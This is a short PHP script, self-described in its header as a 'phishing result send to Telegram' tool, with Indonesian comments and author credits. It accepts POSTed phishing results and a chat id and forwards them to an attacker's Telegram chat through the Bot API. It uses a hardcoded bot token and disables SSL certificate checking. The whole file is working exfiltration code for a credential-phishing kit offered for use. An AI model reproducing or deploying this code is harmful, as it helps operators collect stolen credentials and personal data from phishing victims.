<?php

/** RESULT PHISING SEND TO TELEGRAM V1
 * Code By Telegram Recode By IdhaamPedia<3
 * DO NOT CHANGE COPYRIGHT.
**/

/** START **/
if ($_SERVER['REQUEST_METHOD'] === 'POST') /** HANYA MENERIMA METODE POST **/ {
    $TOKEN  = "843961825:AAFi2W9IOpbMxzXwAc75adwQSAWkj_h0vEI"; /** TOKEN BOT **/
    $chatid = $_POST['chatid'];
    $pesan 	= $_POST['pesan'];

    $method	= "sendMessage"; /** METODE BAWAAN TELEGRAM **/
    $url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method; /** URL UNTUK MENGIRIM RESULT **/

    $post = /** MENAMBAHKAN ID DAN PESAN PADA URL **/ [
    'chat_id' => $chatid,
    // 'parse_mode' => 'HTML',
    'text' => $pesan
    ];

    $header = /** HMMMM ANU **/ [
    "X-Requested-With: XMLHttpRequest",
    "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
    ];

    /** MENGAMBIL DATA DARI WEB TELEGRAMNYA **/
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    //curl_setopt($ch, CURLOPT_REFERER, $refer);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $datas = curl_exec($ch);
    $error = curl_error($ch);
    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $debug['text'] = $pesan;
    $debug['code'] = $status;
    $debug['status'] = $error;
    $debug['respon'] = json_decode($datas, true);

    if($debug) {
        echo "Result Berhasil";
    } else {
        echo "Result Gagal";
    }
} else {
    echo "<script>alert('Gagal: Maaf, IdhaamPedia gabisa kirim resultnya'); window.close(); </script>";
}
/** END RESULT **/
?>